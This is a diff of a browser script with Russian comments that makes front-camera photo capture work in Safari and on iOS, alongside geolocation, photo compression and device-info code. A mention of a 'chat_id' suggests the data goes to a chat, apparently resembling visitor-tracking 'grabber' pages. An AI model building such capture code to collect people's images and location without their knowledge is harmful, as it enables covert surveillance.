@@ -1,4 +1,4 @@
-// === app.js (версия под code -> chat_id, с понятной ошибкой и меньшим фото) ===
+// === app.js (универсальный: Safari / iOS / Android / Desktop) ===
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
@@ -42,7 +42,7 @@ function setBtnReady() {
   b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
 }
 
-// === Геолокация (не критично) ===
+// === Геолокация ===
 async function askGeolocation() {
   return new Promise((resolve) => {
     if (!('geolocation' in navigator)) return resolve(null);
@@ -60,7 +60,7 @@ async function askGeolocation() {
   });
 }
 
-// === Сжатие base64 фото (чуть меньше, чем было) ===
+// === Сжатие base64 фото ===
 function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
   return new Promise((resolve, reject) => {
     const img = new Image();
@@ -81,39 +81,50 @@ function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
   });
 }
 
-// === Фото ===
+// === Фото (совместимо с Safari) ===
 async function takePhoto() {
   if (!navigator.mediaDevices?.getUserMedia)
     throw new Error('Camera unsupported');
 
   const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-  const [track] = stream.getVideoTracks();
-  try {
-    if (typeof ImageCapture !== 'undefined') {
-      const cap = new ImageCapture(track);
-      const bmp = await cap.grabFrame();
-      const c = document.createElement('canvas');
-      c.width = bmp.width;
-      c.height = bmp.height;
-      c.getContext('2d').drawImage(bmp, 0, 0);
-      const dataUrl = c.toDataURL('image/jpeg', 0.85);
-      track.stop();
-      return dataUrl;
+  return new Promise((resolve, reject) => {
+    try {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.playsInline = true;
+
+      video.onloadedmetadata = async () => {
+        try {
+          await video.play();
+          const c = document.createElement('canvas');
+          c.width = video.videoWidth || 1280;
+          c.height = video.videoHeight || 720;
+          c.getContext('2d').drawImage(video, 0, 0);
+          const dataUrl = c.toDataURL('image/jpeg', 0.85);
+          stream.getTracks().forEach(t => t.stop());
+          resolve(dataUrl);
+        } catch (err) {
+          stream.getTracks().forEach(t => t.stop());
+          reject(err);
+        }
+      };
+
+      // fallback если metadata не пришла за 3с
+      setTimeout(() => {
+        try {
+          const c = document.createElement('canvas');
+          c.width = 1280; c.height = 720;
+          c.getContext('2d').drawImage(video, 0, 0);
+          const dataUrl = c.toDataURL('image/jpeg', 0.8);
+          stream.getTracks().forEach(t => t.stop());
+          resolve(dataUrl);
+        } catch (e) { reject(e); }
+      }, 3000);
+    } catch (e) {
+      try { stream.getTracks().forEach(t => t.stop()); } catch {}
+      reject(e);
     }
-    const v = document.createElement('video');
-    v.srcObject = stream;
-    await v.play();
-    const c = document.createElement('canvas');
-    c.width = v.videoWidth || 1280;
-    c.height = v.videoHeight || 720;
-    c.getContext('2d').drawImage(v, 0, 0);
-    const dataUrl = c.toDataURL('image/jpeg', 0.85);
-    stream.getTracks().forEach((t) => t.stop());
-    return dataUrl;
-  } catch (e) {
-    try { track && track.stop(); } catch {}
-    throw e;
-  }
+  });
 }
 
 // === Инфо об устройстве ===
